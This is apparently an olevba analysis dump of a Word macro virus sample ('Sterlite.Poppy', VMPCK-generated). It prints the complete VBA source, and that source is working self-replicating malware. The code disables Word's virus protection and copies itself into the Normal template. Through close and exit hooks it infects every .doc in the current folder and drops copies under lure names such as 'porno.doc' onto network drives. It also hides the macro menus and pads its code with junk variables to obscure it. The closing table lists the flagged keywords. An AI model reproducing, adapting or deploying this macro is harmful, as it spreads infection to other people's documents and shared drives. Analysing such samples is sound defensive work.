olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-376bbad01dd4fc5261e0f8c489fbf61175a1e024
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-376bbad01dd4fc5261e0f8c489fbf61175a1e024 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sterlite.bas 
in file: Virus.MSWord.VMPC-based-376bbad01dd4fc5261e0f8c489fbf61175a1e024 - OLE stream: 'Macros/VBA/sterlite'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub sterlite()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 2738-JhBz57952738.c
    '=================================
    'This Virus Is: Sterlite.Poppy
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
SeUy5153 = FnAlBmOq & ArMv7834 & Int(Rnd * 2468)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("sterlite").Export "c:\sterlite.drv"
ActiveDocument.ReadOnlyRecommended = False
OySl6864 = SjNwByJs & VtFp17070 & RsUnPmNw & UyBl11558
If NormalTemplate.VBProject.VBComponents.Item("sterlite").Name <> "sterlite" Then JoJe2738285011 = True
If ActiveDocument.VBProject.VBComponents.Item("sterlite").Name <> "sterlite" Then SzVl28505 = True
If JoJe2738285011 = True And SzVl28505 = False Then Set HuPj285027383 = NormalTemplate.VBProject.VBComponents
If JoJe2738285011 = False And SzVl28505 = True Then Set HuPj285027383 = ActiveDocument.VBProject.VBComponents
HuPj285027383.import "c:\sterlite.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If SzVl28505 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
MoVxNqHg:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Sterlite_Sucks", vbInformation
End Sub
Sub FileClose()
    On Error Resume Next
    Call sterlite
JsLr16458 = GzPmNqNj & AgJf11820 & Int(Rnd * 8182)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
SxOeFxEz = KfQq9428 & CrNi9576
    ActiveDocument.Close
End Sub
Sub AutoExit()
    On Error Resume Next
    Call sterlite
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call sterlite
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call sterlite
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Sub ToolsMacro()
    On Error Resume Next
RoDz6441 = JhPzNeOo & RzUq13210 & OoJoDuSo & NkGu13046
End Sub
Sub FileTemplates()
    On Error Resume Next
MsAvBkSw = AnFv11963 & JgSl13249
GlCl12213 = DeUrPmLw & RvFh8864 & MiTjKrMr & PoSe11152
End Sub
Sub ViewVBCode()
    On Error Resume Next
PtDfPjJs = DoVy10915 & ByUg10795
BvKt16844 = VnNmBmKy & QqRe8459 & Int(Rnd * 8997)
KiLsTkPp = UhSm6225 & EvMx6382
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|(P'8                |28502738                                     |
+----------+--------------------+---------------------------------------------+

